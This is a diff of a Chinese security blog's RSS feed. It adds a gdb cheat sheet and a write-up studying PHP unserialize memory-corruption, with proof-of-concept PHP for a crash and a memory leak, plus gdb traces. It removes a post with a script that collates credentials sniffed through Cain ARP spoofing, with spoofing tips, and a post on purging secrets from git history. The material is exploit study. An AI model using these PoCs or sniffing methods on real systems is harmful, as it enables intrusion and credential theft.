@@ -5,9 +5,323 @@
     <description>A blog about programming and network security</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Tue, 18 Apr 2017 22:51:41 +0800</pubDate>
-    <lastBuildDate>Tue, 18 Apr 2017 22:51:41 +0800</lastBuildDate>
+    <pubDate>Mon, 24 Apr 2017 08:06:31 +0800</pubDate>
+    <lastBuildDate>Mon, 24 Apr 2017 08:06:31 +0800</lastBuildDate>
     <generator>Jekyll v3.4.2</generator>
+    
+      <item>
+        <title>gdb命令</title>
+        <description>&lt;h3 id=&quot;0x01-gdb常用命令&quot;&gt;0x01 gdb常用命令&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb
+help
+help data
+help stack
+help status
+
+gdb stack0           #===&amp;gt;gdb + file stack0
+l(list)              #show source
+b 7(break 7)         #add break on line7
+b 8(break 8)         #add break on line8
+b 11
+b 13
+b 15
+info b(info break)
+info registers       #show registers
+r(run)               #第一次运行或重新开始运行程序
+start                #开始运行程序
+continue             #继续运行
+disas /m
+            /r      #show hex(显示汇编指令对应十六进制值)
+            /m      #show source if available(如果有源码,显示对应行源码)
+set disassembly-flavor att/intel     #设置att或intel格式
+set disassemble-next-line            #设置下一步是否显示汇编码
+si或s(setpi)                            #==&amp;gt; step into,like f7 in od
+ni或n(nexti)                            #==&amp;gt; like f8 in od
+leave                #立即中断当前函数运行并返回,当前函数的剩余语句将不被执行
+finish               #执行到当前函数返回之后停止,当前函数的剩余语句将正常运行
+bt(backtrace)        #查看所有栈帧信息
+f num(frame num)     #选择并打印第num个栈帧信息
+info f(info frame)   #查看当前栈帧信息
+
+layout:用于分割窗口,可以一边查看代码,一边测试:
+layout src:显示源代码窗口
+layout asm:显示反汇编窗口
+layout regs:显示源代码/反汇编和CPU寄存器窗口
+layout split:显示源代码和反汇编窗口
+Ctrl + L:刷新窗口
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Thu, 20 Apr 2017 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/web/2017/04/20/gdb%E5%91%BD%E4%BB%A4/</link>
+        <guid isPermaLink="true">http://localhost:4000/web/2017/04/20/gdb%E5%91%BD%E4%BB%A4/</guid>
+        
+        <category>gdb</category>
+        
+        <category>commands</category>
+        
+        <category>linux</category>
+        
+        
+        <category>web</category>
+        
+      </item>
+    
+      <item>
+        <title>PHP中的内存破坏漏洞利用学习</title>
+        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;学习乌云中的&amp;lt;&amp;lt;PHP中的内存破坏漏洞利用&amp;gt;&amp;gt;
+link:http://cb.drops.wiki/drops/papers-4864.html
+
+看懂此文所需知识
+http://www.cnblogs.com/LittleHann/p/4242535.html
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x01-detail&quot;&gt;0x01 Detail&lt;/h3&gt;
+
+&lt;h4 id=&quot;a调试环境&quot;&gt;a)调试环境&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali2 x86 
+php5.4.34
+gdb
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;b环境配置&quot;&gt;b)环境配置&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.下载php5.4.34到/root/php5.4.34    
+    php5.4.34根目录下的.gdbinit是php为了方便被gdb调试,需要在gdb php之后source path/.gdbinit
+        link:https://phpor.net/blog/post/997
+        print_cvs:打印当前执行环境中已编译的PHP变量
+        printzv 0x....:打印指定的PHP变量,需要指定地址
+        zbacktrace:打印PHP函数调用栈
+        print_ft:打印函数表 
+        更多用法参考上面的链接
+
+2.编译php到指定目录
+    kali2.0下:
+    mkdir /usr/bin/ndphp
+    ./configure --prefix=/usr/bin/ndphp
+        如果报xml2-config错误则apt-get install libxml2-dev可解决
+    make
+    make install
+
+3.vi /root/StefanEsser_Original_POC.php
+    -----------start------------
+    &amp;lt;?php
+    for ($i=4; $i&amp;lt;100; $i++) {
+      var_dump($i);
+
+      $m = new StdClass(); 
+      $u = array(1); 
+      $m-&amp;gt;aaa = array(1,2,&amp;amp;$u,4,5);
+
+      $m-&amp;gt;bbb = 1;
+      $m-&amp;gt;ccc = &amp;amp;$u;
+      $m-&amp;gt;ddd = str_repeat(&quot;A&quot;, $i); 
+      $z = serialize($m);
+      $z = str_replace(&quot;bbb&quot;, &quot;aaa&quot;, $z);
+
+      var_dump($z);
+
+      $y = unserialize($z);
+
+      var_dump($y);
+    }
+    ?&amp;gt;
+    -----------end------------
+
+4.vi /root/StefanEsser_Original_LocalMemLeak.php
+    -----------start------------
+    &amp;lt;?php
+    $data ='O:8:&quot;stdClass&quot;:3:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;s:39:&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;;i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;}';
+    $x = unserialize($data);
+    var_dump($x);
+    ?&amp;gt;
+    -----------end------------
+5.vi /root/PHPLeak.php
+    -----------start------------
+    &amp;lt;?php
+    $fakezval = pack(
+        'IIII',     //unsigned int
+        0x08048000, //address to leak
+        0x0000000f, //length of string
+        0x00000000, //refcount
+        0x00000006  //data type NULL=0,LONG=1,DOUBLE=2,BOOL=3,ARR=4,OBJ=5,STR=6,RES=7
+    );
+    //obj from original POC by @ion1c
+    $obj = 'O:8:&quot;stdClass&quot;:4:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;s:3:&quot;ddd&quot;;s:4:&quot;AAAA&quot;;}';
+    $obj=unserialize($obj);
+
+    for($i = 0; $i &amp;lt; 5; $i++) { //this i value is larger than usually required
+        $v[$i]=$fakezval.$i; //repeat to overwrite
+    }
+    //due to the reference being overwritten by our loop above, leak memory
+    echo $obj-&amp;gt;ccc;
+    ?&amp;gt;
+    -----------end------------
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;c调试&quot;&gt;c)调试&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;测试StefanEsser_Original_POC.php是否会导致php解释器出问题
+    └&amp;gt; /usr/bin/ndphp/bin/php StefanEsser_Original_POC.php 
+    int(4)
+    string(134) &quot;O:8:&quot;stdClass&quot;:4:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;s:3:&quot;ddd&quot;;s:4:&quot;AAAA&quot;;}&quot;
+    object(stdClass)#2 (3) {
+      [&quot;aaa&quot;]=&amp;gt;
+      int(1)
+      [&quot;ccc&quot;]=&amp;gt;
+      &amp;amp;NULL
+      [&quot;ddd&quot;]=&amp;gt;
+      string(4) &quot;AAAA&quot;
+    }
+    int(5)
+    string(135) &quot;O:8:&quot;stdClass&quot;:4:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;s:3:&quot;ddd&quot;;s:5:&quot;AAAAA&quot;;}&quot;
+    object(stdClass)#1 (3) {
+      [&quot;aaa&quot;]=&amp;gt;
+      int(-1254177400)
+      [&quot;ccc&quot;]=&amp;gt;
+      &amp;amp;NULL
+      [&quot;ddd&quot;]=&amp;gt;
+      string(5) &quot;AAAAA&quot;
+    }
+    int(6)
+    string(136) &quot;O:8:&quot;stdClass&quot;:4:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;s:3:&quot;ddd&quot;;s:6:&quot;AAAAAA&quot;;}&quot;
+    object(stdClass)#3 (3) {
+      [&quot;aaa&quot;]=&amp;gt;
+      int(1)
+      [&quot;ccc&quot;]=&amp;gt;
+      &amp;amp;NULL
+      [&quot;ddd&quot;]=&amp;gt;
+      string(6) &quot;AAAAAA&quot;
+    }
+    int(7)
+    string(137) &quot;O:8:&quot;stdClass&quot;:4:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;s:3:&quot;ddd&quot;;s:7:&quot;AAAAAAA&quot;;}&quot;
+    object(stdClass)#2 (3) {
+      [&quot;aaa&quot;]=&amp;gt;
+      int(1)
+      [&quot;ccc&quot;]=&amp;gt;
+      &amp;amp;NULL
+      [&quot;ddd&quot;]=&amp;gt;
+      string(7) &quot;AAAAAAA&quot;
+    }
+    int(8)
+    string(138) &quot;O:8:&quot;stdClass&quot;:4:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;s:3:&quot;ddd&quot;;s:8:&quot;AAAAAAAA&quot;;}&quot;
+    object(stdClass)#1 (3) {
+      [&quot;aaa&quot;]=&amp;gt;
+      int(1)
+      [&quot;ccc&quot;]=&amp;gt;
+      &amp;amp;NULL
+      [&quot;ddd&quot;]=&amp;gt;
+      string(8) &quot;AAAAAAAA&quot;
+    }
+    int(9)
+    string(139) &quot;O:8:&quot;stdClass&quot;:4:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;s:3:&quot;ddd&quot;;s:9:&quot;AAAAAAAAA&quot;;}&quot;
+    [1]    2141 segmentation fault  /usr/bin/ndphp/bin/php StefanEsser_Original_POC.php
+
+    果然出现segmentation fault
+
+动态调试php
+    └&amp;gt; gdb /usr/bin/ndphp/bin/php
+    GNU gdb (Debian 7.11.1-2) 7.11.1
+    Copyright (C) 2016 Free Software Foundation, Inc.
+    License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
+    This is free software: you are free to change and redistribute it.
+    There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;
+    and &quot;show warranty&quot; for details.
+    This GDB was configured as &quot;x86_64-linux-gnu&quot;.
+    Type &quot;show configuration&quot; for configuration details.
+    For bug reporting instructions, please see:
+    &amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;.
+    Find the GDB manual and other documentation resources online at:
+    &amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.
+    For help, type &quot;help&quot;.
+    Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...
+    Reading symbols from /usr/bin/ndphp/bin/php...done.
+
+    [加载php根目录下的.gdbinit]
+    source /root/php-5.4.34/.gdbinit
+
+    [下断点]
+    (gdb) b var_unserializer.c:337
+
+    [运行StefanEsser_Original_LocalMemLeak.php]
+    r StefanEsser_Original_LocalMemLeak.php
+
+    [第一次命中]
+    Starting program: /usr/bin/ndphp/bin/php StefanEsser_Original_LocalMemLeak.php
+    [Thread debugging using libthread_db enabled]
+    Using host libthread_db library &quot;/lib/i386-linux-gnu/libthread_db.so.1&quot;.
+
+    Breakpoint 1, process_nested_data (p=p@entry=0xbfffbc48, max=max@entry=0xb5b65cfa &quot;&quot;, var_hash=var_hash@entry=0xbfffbc4c, ht=0xb5c6f9c4, elements=2, objprops=1, rval=0xbfffbc64) at /root/php-5.4.34/ext/standard/var_unserializer.c:337
+    337                             convert_to_string(key);
+
+    [跳过第一次命中后又发生了第二次命中]
+    (gdb) c
+    Continuing.
+
+    Breakpoint 1, process_nested_data (p=p@entry=0xbfffbc48, max=max@entry=0xb5b65cfa &quot;&quot;, var_hash=var_hash@entry=0xbfffbc4c, ht=0xb5c6f9c4, elements=1, objprops=1, rval=0xbfffbc64) at /root/php-5.4.34/ext/standard/var_unserializer.c:337
+    337                             convert_to_string(key);
+
+    [执行print *(var_entries*)var_hash-&amp;gt;first][乌云上的原文说的执行printzv *(var_entries)var_hash-&amp;gt;first有误]
+    (gdb) print *(var_entries*)var_hash-&amp;gt;first
+    $1 = {data = {0xb5c6e9e0, 0xb5c6f9f4, 0xb5c6f108, 0xb5c6f178, 0xb5c6f1c0, 0xb5c6f238, 0xb5c6f280, 0xb5c6f0ec, 0x0 &amp;lt;repeats 1016 times&amp;gt;}, used_slots = 8, next = 0x0}
+    可看出data变量是个数组,数组里面的内容是地址,这些地址指向unserialize函数解析的变量值,关注第5个0xb5c6f1c0(php
+    代码中用的是R:5).查看这个地址中的内容:
+
+    [printzv 0xb5c6f1c0]
+    (gdb) printzv 0xb5c6f1c0
+    [0xb5c6f1c0] (refcount=1) string(39): &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+
+    [步过断点继续运行]
+    (gdb) n
+    338                             zend_hash_update(ht, Z_STRVAL_P(key), Z_STRLEN_P(key) + 1, &amp;amp;data,
+    这里的zend_hash_update为可疑函数
+    
+    步过该可疑函数并查看刚才地址0xb5c6f1c0中出现了什么内容
+    (gdb) n
+    342                     zval_dtor(key);
+    (gdb) printzv 0xb5c6f1c0
+    [0xb5c6f1c0] (refcount=0) string(39): &quot;\35\0\0\0-\0\0\0\0\37777777761\37777777706\37777777665\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0-\0\0\0\35\0\0\0D\37777777761\37777777706&quot;
+
+    还要确认下该地址是不是还在var_hash表中,然后继续运行
+    (gdb) print *(var_entries*)var_hash-&amp;gt;first
+    $3 = {data = {0xb5c6e9e0, 0xb5c6f9f4, 0xb5c6f108, 0xb5c6f178, 0xb5c6f1c0, 0xb5c6f238, 0xb5c6f280, 0xb5c6f0ec, 0x0 &amp;lt;repeats 1016 times&amp;gt;}, used_slots = 8, next = 0x0}
+    发现还在
+
+    继续运行
+    (gdb) c
+    Continuing.
+    object(stdClass)#1 (2) {
+      [&quot;aaa&quot;]=&amp;gt;
+      int(1)
+      [&quot;ccc&quot;]=&amp;gt;
+      &amp;amp;string(39) &quot;--D&quot;
+    }
+    [Inferior 1 (process 2416) exited normally]
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Wed, 19 Apr 2017 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/web/2017/04/19/PHP%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E7%A0%B4%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/</link>
+        <guid isPermaLink="true">http://localhost:4000/web/2017/04/19/PHP%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E7%A0%B4%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/</guid>
+        
+        <category>php</category>
+        
+        <category>漏洞利用</category>
+        
+        <category>二进制</category>
+        
+        
+        <category>web</category>
+        
+      </item>
     
       <item>
         <title>unserialize免杀webshell</title>
@@ -67,6 +381,13 @@ echo &quot;please visit uri:\n&quot;.&quot;[your shell page url]&quot;.&quot;?id
 
 &lt;p&gt;本文代码对应下载链接如下&lt;br /&gt;
 &lt;a href=&quot;https://github.com/3xp10it/xwebshell/tree/master/unserializePHP&quot;&gt;download&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;more&quot;&gt;more&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;后来发现下面这篇文章已经总结得得好了
+http://www.cnblogs.com/LittleHann/p/3522990.html
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 
 </description>
         <pubDate>Tue, 18 Apr 2017 00:00:00 +0800</pubDate>
@@ -1196,143 +1517,6 @@ lo        Link encap:Local Loopback
         
         
         <category>web</category>
-        
-      </item>
-    
-      <item>
-        <title>cain口令整理脚本</title>
-        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cain嗅探到的口令存放在cain目录下的lst文件中,包括pop3.lst,http.lst,smtp.lst,imap.lst,ftp.lst...等,脚本用法如下:
-eg.
-    用法1:
-        python3 getCainKey.py pop3.lst
-    用法2:
-        from exp10it import getCainKey
-        getCainKey(lstFile)
-
-在同目录下生成pop3.lst-cainOutPut.txt为整理后的结果
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;code&quot;&gt;Code&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#参数为文件名
-#也即cain目录下的.lst文件[pop3.lst,http.lst,smtp.lst,imap.lst,ftp.lst,...等包含用户名口令的文件]
-#效果为在程序当前目录下生成一个xxx-cainOutPut.txt为整理后的文件
-import re
-import sys
-with open(sys.argv[1],&quot;r+&quot;) as f:
-    allLines=f.readlines()
-AddedLines=[]
-for eachLine in allLines:    
-    #a=re.search(r&quot;[\S]+\s+-\s+[\S]+\s+[\S]+\s+[\S]+\s+([\S]+)\s+([\S]+)\s+[\S]+\s&quot;,eachLine,re.I)
-    a=re.search(r&quot;[\S]+\s+-\s+[\S]+\s+[\S]+\s+[\S]+\s+([\S]+)\s+([\S]+).*\s&quot;,eachLine,re.I)
-    if a:
-        userField=a.group(1)
-        passField=a.group(2)
-        string2write=userField+&quot;:&quot;+passField+&quot;\n&quot;
-        print(string2write)
-        if string2write not in AddedLines:
-            shouldWrite=1
-            for each in AddedLines:
-                if each[:len(userField)]!=userField: 
-                    continue
-                else:
-                    if passField==each.split(&quot;:&quot;)[1][:-1]:
-                        shouldWrite=0
-                    break
-            if shouldWrite==1:
-                AddedLines.append(string2write)
-                with open(sys.argv[1]+&quot;-cainOutPut.txt&quot;,&quot;a+&quot;) as f:
-                    f.write(string2write)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;link&quot;&gt;Link&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://raw.githubusercontent.com/3xp10it/mytools/master/getCainKey.py&quot;&gt;getCainKey&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;attention&quot;&gt;Attention&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;使用cain过一段时间后如果要重新sniffe+arp需要在arp选项卡下重新扫描网络,重新设置arp欺骗时伪造的ip,然后再打开arp欺
-骗开关,否则如果有机器重启后ip发生变化则不能欺骗到变化了ip的机器.另外实施arp欺骗时如果设置伪造ip为路由器所在
-ip[eg.192.168.1.1]容易造成网络堵塞,造成内网无法访问互联网,也难以嗅探到密码,一般可将伪造ip设置为内网的非路由器的
-如mysql,mssql,imap,pop3,smtp等服务器的ip
-
-一般在访问一个https网站时经常出现说这个网站出错了,需要将url添加到信任才可访问,这种情况很有可能就是由于目标服务
-器所在网络被sniffe+arp欺骗了,由cain在中间提供并非官方的cert证书,浏览器检测到cert异常才会提示网站访问出错,需要添
-加信任才可访问.
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-</description>
-        <pubDate>Fri, 17 Feb 2017 00:00:00 +0800</pubDate>
-        <link>http://3xp10it.cc/python/2017/02/17/cain%E5%8F%A3%E4%BB%A4%E6%95%B4%E7%90%86%E8%84%9A%E6%9C%AC/</link>
-        <guid isPermaLink="true">http://localhost:4000/python/2017/02/17/cain%E5%8F%A3%E4%BB%A4%E6%95%B4%E7%90%86%E8%84%9A%E6%9C%AC/</guid>
-        
-        <category>cain</category>
-        
-        <category>python</category>
-        
-        
-        <category>python</category>
-        
-      </item>
-    
-      <item>
-        <title>删除github项目历史版本中的敏感文件</title>
-        <description>&lt;h3 id=&quot;steps&quot;&gt;Steps&lt;/h3&gt;
-
-&lt;p&gt;eg.删除https://www.github.com/3xp10it/MyToolKit项目历史版本中敏感文件&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.cd /tmp &amp;amp;&amp;amp; git clone https://github.com/dxa4481/truffleHog.git &amp;amp;&amp;amp; cd truffleHog
-2.pip3 install -r requirements.txt
-3.python3 truffleHog.py https://www.github.com/3xp10it/MyToolKit
-    or
-  python3 truffleHog.py https://github.com/3xp10it/MyToolKit.git
-  此时找到了有敏感密码的文件my_bing_domains_v1_alone.py
-4.cd /tmp &amp;amp;&amp;amp; git clone https://github.com/3xp10it/MyToolKit.git &amp;amp;&amp;amp; cd MyToolKit
-5.cp my_bing_domains_v1_alone.py /tmp/
-  这里是为了备份这个有敏感密码的文件
-6.git filter-branch --force --index-filter 'git rm --cached --ignore-unmatch my_bing_domains_v1_alone.py' --prune-empty --tag-name-filter cat -- --all
-  这里是为了删除所有commit中的my_bing_domains_v1_alone.py文件
-7.git push origin --force --all
-8.git push origin --force --tags
-9.git for-each-ref --format='delete %(refname)' refs/original | git update-ref --stdin
-10.git reflog expire --expire=now --all
-11.git gc --prune=now
-12.python3 /tmp/truffleHog/truffleHog.py https://www.github.com/3xp10it/MyToolKit
-  这里是为了验证是否成功清除历史版本中的敏感文件
-13.如果有需要,将备份的my_bing_domains_v1_alone.py有关密码的部分代码修改成没有明文密码后上传到github 
-    cp /tmp/my_bing_domains_v1_alone.py /tmp/MyToolKit/
-    cd /tmp/MyToolKit
-    git add .
-    git commit -a -m &quot;clean passwords&quot;
-    git push -u origin master
-    如果没有必要将my_bing_domains_v1_alone.py文件上传则这一步不需要,例如my_bing_domains_v1_alone.py文件是一个纯
-    配置文件而没有关键代码的时候,这时直接将所有历史版本中的该文件删除即可
-14.done
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;reffer&quot;&gt;Reffer&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://help.github.com/articles/removing-sensitive-data-from-a-repository/
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-</description>
-        <pubDate>Mon, 16 Jan 2017 00:00:00 +0800</pubDate>
-        <link>http://3xp10it.cc/auxilary/2017/01/16/%E5%88%A0%E9%99%A4github%E9%A1%B9%E7%9B%AE%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC%E4%B8%AD%E7%9A%84%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/</link>
-        <guid isPermaLink="true">http://localhost:4000/auxilary/2017/01/16/%E5%88%A0%E9%99%A4github%E9%A1%B9%E7%9B%AE%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC%E4%B8%AD%E7%9A%84%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/</guid>
-        
-        <category>git</category>
-        
-        <category>github</category>
-        
-        <category>truffleHog</category>
-        
-        
-        <category>auxilary</category>
         
       </item>
     
